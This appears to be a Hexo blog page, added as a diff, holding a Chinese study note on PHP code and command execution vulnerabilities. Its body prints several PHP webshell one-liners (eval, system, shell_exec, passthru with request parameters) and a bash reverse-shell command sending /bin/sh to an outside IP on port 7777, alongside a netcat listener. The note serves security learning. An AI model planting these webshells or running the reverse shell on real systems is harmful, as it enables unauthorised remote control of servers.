@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"搜索帖子","hits_empty":"我们没有找到任何搜索结果: ${query}","hits_stats":"在 ${time} 毫秒内找到 ${hits} 结果"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="关于命令执行与代码执行相关的基础学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行&#x2F;代码执行学习基础">
+<meta property="og:url" content="http://example.com/2024/10/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="关于命令执行与代码执行相关的基础学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.imgur.com/fQBP5PS.gif">
+<meta property="og:image" content="https://i.imgur.com/fQBP5PS.gif">
+<meta property="og:image" content="https://i.imgur.com/hSZf6oC.gif">
+<meta property="og:image" content="https://i.imgur.com/5xPJuUC.gif">
+<meta property="og:image" content="https://i.imgur.com/PQo89We.gif">
+<meta property="og:image" content="https://i.imgur.com/ZnzNLAA.gif">
+<meta property="og:image" content="https://i.imgur.com/Cei019z.gif">
+<meta property="og:image" content="https://i.imgur.com/Jd7pYS5.gif">
+<meta property="og:image" content="https://i.imgur.com/TRq5uwt.gif">
+<meta property="og:image" content="https://i.imgur.com/WwtQ9CM.gif">
+<meta property="og:image" content="https://i.imgur.com/pHVO764.gif">
+<meta property="og:image" content="https://i.imgur.com/Hj1BUUR.gif">
+<meta property="og:image" content="https://i.imgur.com/8KUjqZF.gif">
+<meta property="og:image" content="https://i.imgur.com/jLmwThT.gif">
+<meta property="og:image" content="https://i.imgur.com/PS4bDmZ.gif">
+<meta property="og:image" content="https://i.imgur.com/Ft8WYcP.png">
+<meta property="og:image" content="https://i.imgur.com/k2dmKxB.png">
+<meta property="og:image" content="https://i.imgur.com/ewmDEZ9.png">
+<meta property="og:image" content="https://i.imgur.com/8zTh35m.png">
+<meta property="og:image" content="https://i.imgur.com/DgV2dTf.png">
+<meta property="og:image" content="https://i.imgur.com/lv1dKgg.png">
+<meta property="og:image" content="https://i.imgur.com/BhJDExU.gif">
+<meta property="og:image" content="https://i.imgur.com/L7MfAir.png">
+<meta property="og:image" content="https://i.imgur.com/vkEC7x3.gif">
+<meta property="article:published_time" content="2024-10-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-21T07:27:53.593Z">
+<meta property="article:author" content="kec的博客">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="Liunx">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/fQBP5PS.gif">
+
+<link rel="canonical" href="http://example.com/2024/10/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>命令执行/代码执行学习基础 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="kec的博客">
+      <meta itemprop="description" content="一句话的长度">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          命令执行/代码执行学习基础
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-10-06 00:00:00" itemprop="dateCreated datePublished" datetime="2024-10-06T00:00:00+08:00">2024-10-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-12-21 15:27:53" itemprop="dateModified" datetime="2024-12-21T15:27:53+08:00">2024-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote class="blockquote-center">
+            <i class="fa fa-quote-left"></i>
+            <p>关于命令执行与代码执行相关的基础学习</p>
+
+            <i class="fa fa-quote-right"></i>
+          </blockquote>
+
+<span id="more"></span>
+
+<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>命令执行<br>开发者没有严格校验并过滤用户输入的内容，使用户输入的数据拼接到命令执行函数中，并执行</p>
+<p>代码执行：<br>开发者没有严格校验并过滤用户输入的内容，使用户输入的数据拼接到代码执行函数中，并执行</p>
+<hr>
+<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><p>参考：<a target="_blank" rel="noopener" href="https://y4er.com/posts/code-exec/#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">代码执行&#x2F;命令执行总结 - Y4er的博客</a></p>
+<p>一行正常的php代码段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;echo &#x27;hello world!&#x27;;&quot;</span>;       </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);       <span class="comment">//php代码执行函数，将a中的php代码提取并执行</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);     <span class="comment">//cmd代码执行函数，将a中的字段直接拼接到cmd中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里使用代码执行函数执行了变量a中的代码段，以此，当php代码段中存在用户输入时，便是代码执行的漏洞，注意，这两个是不同的环境</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;print(&#x27;a&#x27;)&#x27;;&quot;</span>; </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);       <span class="comment">//php代码执行函数，将a中的php代码提取并执行</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$b</span>);     <span class="comment">//cmd代码执行函数，将a中的字段直接拼接到cmd中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里<code>system($b)</code>执行<code>whoami</code>的cmd命令，<code>eval($a)</code>执行的php代码<code>print(&#39;a&#39;)&#39;;</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;print(&#x27;a&#x27;)&#x27;;&quot;</span>; </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$b</span>));      <span class="comment">//括号内优先执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>这属于是文件上传常见的木马，<code>?cmd=phpinfo();</code>执行php代码，当传入的值为<code>?cmd=system(&quot;whoami&quot;)</code>，这就是文件上传常用的命令</p>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单利用，写一个1.php文件</p>
+<p><img src="https://i.imgur.com/fQBP5PS.gif"></p>
+<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>简单利用，写一个1.php文件</p>
+<p><img src="https://i.imgur.com/fQBP5PS.gif"></p>
+<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace — 执行一个正则表达式的搜索和替换 搜索subject中匹配pattern的部分， 以replacement进行替换。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/所替换字节.*/e&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>],<span class="string">&#x27;任意字节&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>会搜索任意字节中的所替换字节进行替换，替换成命令执行部分的函数</p>
+<p>下面示例1.txt中任意字节部分为jutst test字符串，替换字节为test，匹配将test替换成了代码执行函数</p>
+<p><img src="https://i.imgur.com/hSZf6oC.gif"></p>
+<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span> ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+
+<p>create_function函数接收两个参数<code>$args</code> 和 <code>$code</code> 然后组成新函数<code>function_lambda_func($args)&#123;$code;&#125;</code> 并<code>eval(function_lambda_func($args)&#123;$code;&#125;)</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="variable">$c</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们不需要传参数，直接把<code>$code</code>改为普通的一句话就行了。</p>
+<p><img src="https://i.imgur.com/5xPJuUC.gif"></p>
+<h4 id="arry-map"><a href="#arry-map" class="headerlink" title="arry_map()"></a>arry_map()</h4><hr>
+<h1 id="命令执行常用函数"><a href="#命令执行常用函数" class="headerlink" title="命令执行常用函数"></a>命令执行常用函数</h1><p>记录一些常用的命令执行函数</p>
+<h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h2><p>简单使用</p>
+<p><img src="https://i.imgur.com/PQo89We.gif"></p>
+<p>写马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span> `a`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/ZnzNLAA.gif"></p>
+<h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>执行外部程序，并且显示输出，本函数执行 command 参数所指定的命令， 并且输出执行结果。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行示例</p>
+<p><img src="https://i.imgur.com/Cei019z.gif" alt="Cei019z.gif"></p>
+<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>执行 command 参数所指定的命令,且只返回最数据的最后一行。注意，这并不会直接显示结果，需要打印函数(print,echo之类的)。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行示例</p>
+<p><img src="https://i.imgur.com/Jd7pYS5.gif"></p>
+<h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h2><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用示例</p>
+<p><img src="https://i.imgur.com/TRq5uwt.gif"></p>
+<h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行外部程序并且显示原始输出</p>
+<p><img src="https://i.imgur.com/WwtQ9CM.gif" alt="WwtQ9CM.gif"></p>
+<h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h2><h2 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h2><h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h2><p>执行一个命令并且用来打开输入&#x2F;输出的文件指针</p>
+<h1 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h1><p>1.有回显的命令注入判断：通过读取系统存在的文件或者执行系统命令:whoami,id等</p>
+<p>2.无回显命令注入判断：</p>
+<ul>
+<li>写入或者删除文件</li>
+<li>dnslog判断,如果被拦截就是用其他网页或者自己进行服务器搭建</li>
+</ul>
+<hr>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>由于防火墙只限制入，不限制出网，所以将链接状态变为服务器向外部发起连接</p>
+<p>操作步骤：</p>
+<p>本地监听端口：<code>nc -lvvp 7777</code></p>
+<p>受害者执行<code>/bin/sh -i &gt;&amp; /dev/tcp/49.232.55.19/7777 0&gt;&amp;1</code></p>
+<h2 id="反弹shell演示"><a href="#反弹shell演示" class="headerlink" title="反弹shell演示"></a>反弹shell演示</h2><p>这里主要使用了另外的网页工具进行辅助，但实际上用处不大</p>
+<p>攻击机:192.168.187.132<br>攻击机监听端口</p>
+<p><img src="https://i.imgur.com/pHVO764.gif"></p>
+<p>靶机执行反弹shell的命令</p>
+<p><img src="https://i.imgur.com/Hj1BUUR.gif"></p>
+<p>使用默认sh反弹到shell</p>
+<p><img src="https://i.imgur.com/8KUjqZF.gif"></p>
+<p>尝试使用python反弹shell</p>
+<p><img src="https://i.imgur.com/jLmwThT.gif"></p>
+<p>反弹shell可采用多种方式</p>
+<hr>
+<h1 id="Windows常用命令"><a href="#Windows常用命令" class="headerlink" title="Windows常用命令"></a>Windows常用命令</h1><p>记录一下windows常用命令</p>
+<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>记录一些Linux常用命令</p>
+<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>首先写一个测试文件2.txt</p>
+<p><img src="https://i.imgur.com/PS4bDmZ.gif"></p>
+<h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>第一行开始显示内容，并将所有内容输出.</p>
+<p><img src="https://i.imgur.com/Ft8WYcP.png"></p>
+<h4 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h4><p>从最后一行倒序显示内容，并将所有内容输出.</p>
+<p><img src="https://i.imgur.com/k2dmKxB.png"></p>
+<h4 id="head"><a href="#head" class="headerlink" title="head"></a>head</h4><p>只显示头几行。</p>
+<p>可加<code>-c</code> 设置一次显示的字符数。<code>-n</code>设置从显示行数。</p>
+<p><img src="https://i.imgur.com/ewmDEZ9.png"></p>
+<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>使用文件协议读文件</p>
+<p><img src="https://i.imgur.com/8zTh35m.png"></p>
+<h3 id="目录读取"><a href="#目录读取" class="headerlink" title="目录读取"></a>目录读取</h3><h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><p>用于查看参数目录下的文件。基本用法：ls 文件路径</p>
+<p><img src="https://i.imgur.com/DgV2dTf.png"></p>
+<h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h4><p>与ls类似，用于查看参数目录下的文件。基本 用法：dir 文件路径</p>
+<p><img src="https://i.imgur.com/lv1dKgg.png"><br>默认查看</p>
+<h3 id="Linux链接符"><a href="#Linux链接符" class="headerlink" title="Linux链接符"></a>Linux链接符</h3><h4 id="“-”分号用法"><a href="#“-”分号用法" class="headerlink" title="“;”分号用法"></a><strong>“<code>;</code>”分号用法</strong></h4><p>方式：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure>
+
+<p>作用：隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
+<p><img src="https://i.imgur.com/BhJDExU.gif"></p>
+<p><img src="https://i.imgur.com/L7MfAir.png"></p>
+<h4 id="“-”管道符用法"><a href="#“-”管道符用法" class="headerlink" title="“| ”管道符用法"></a><strong>“<code>|</code> ”管道符用法</strong></h4><p>方式：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2</span><br></pre></td></tr></table></figure>
+
+<p>作用：链接命令执行，上一条命令的输出，作为下一条命令参数。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推.</p>
+<hr>
+<h1 id="提及话题"><a href="#提及话题" class="headerlink" title="提及话题"></a>提及话题</h1><ol>
+<li><p>使用<code>chr()</code>内置函数绕过<br><img src="https://i.imgur.com/vkEC7x3.gif"></p>
+</li>
+<li><p>反弹shell命令网站：<a target="_blank" rel="noopener" href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</a></p>
+</li>
+<li><p>一句话木马详解<br>示例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><p><strong><code>&lt;?php ... ?&gt;</code></strong></p>
+<ul>
+<li>表示 PHP 脚本的开始和结束标记，PHP 代码写在这对标记之间。</li>
+</ul>
+</li>
+<li><p><strong><code>@eval()</code></strong></p>
+<ul>
+<li><code>eval()</code> 是一个危险的 PHP 函数，它会将传入的字符串作为 PHP 代码执行。</li>
+<li><code>@</code> 是 PHP 中的错误抑制操作符，它会隐藏 <code>eval()</code> 运行时可能出现的错误或警告。</li>
+</ul>
+</li>
+<li><p><strong><code>$_POST[&#39;cmd&#39;]</code></strong></p>
+<ul>
+<li><code>$_POST</code> 是一个全局变量，用来获取通过 HTTP POST 请求传递的数据。</li>
+<li><code>$_POST[&#39;cmd&#39;]</code> 是从 POST 请求中读取键名为 <code>cmd</code> 的值（内容由外部提供）。</li>
+<li>代码将这个内容直接传递给 <code>eval()</code> 函数。</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"># 命令执行</a>
+              <a href="/tags/Liunx/" rel="tag"># Liunx</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/10/05/CSRF/" rel="prev" title="CSRF基础学习">
+      <i class="fa fa-chevron-left"></i> CSRF基础学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/10/06/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/" rel="next" title="Redis未授权基础学习">
+      Redis未授权基础学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89"><span class="nav-number">1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.</span> <span class="nav-text">常用函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#eval"><span class="nav-number">2.0.1.1.</span> <span class="nav-text">eval()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#assert"><span class="nav-number">2.0.1.2.</span> <span class="nav-text">assert()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-replace"><span class="nav-number">2.0.1.3.</span> <span class="nav-text">preg_replace()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#create-function"><span class="nav-number">2.0.1.4.</span> <span class="nav-text">create_function</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#arry-map"><span class="nav-number">2.0.1.5.</span> 